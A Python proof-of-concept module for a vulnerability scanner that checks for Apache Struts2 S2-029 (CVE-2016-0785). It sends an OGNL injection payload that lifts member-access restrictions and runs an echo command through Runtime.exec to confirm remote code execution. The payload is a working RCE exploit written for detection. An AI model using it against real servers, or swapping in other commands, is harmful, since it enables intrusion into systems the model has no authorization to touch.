# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0011_p'  # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-029远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2016-04-27'  # 漏洞公布时间
    desc = '''
        Apache Struts2中存在漏洞，Apache在强制时支持框架，对给定的标签执行属性值的双重评估，因此可以传递一个值，该值将在呈现标签属性时再次被评估。  
    '''  # 漏洞描述
    ref = 'https://cwiki.apache.org/confluence/display/WW/S2-029'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2016-0785'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    # 漏洞应用版本
    product_version = 'Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)'


class Poc(ABPoc):
    poc_id = '9bf6ac58-a251-4cf4-a3c3-13a8807bce8d'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = {'message': '''(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('echo 92933839f1efb2da9a4799753ee8d79c').getInputStream()))'''}
            request = requests.get(
                '{target}/default.action'.format(target=self.target), params=payload)
            r = request.text
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
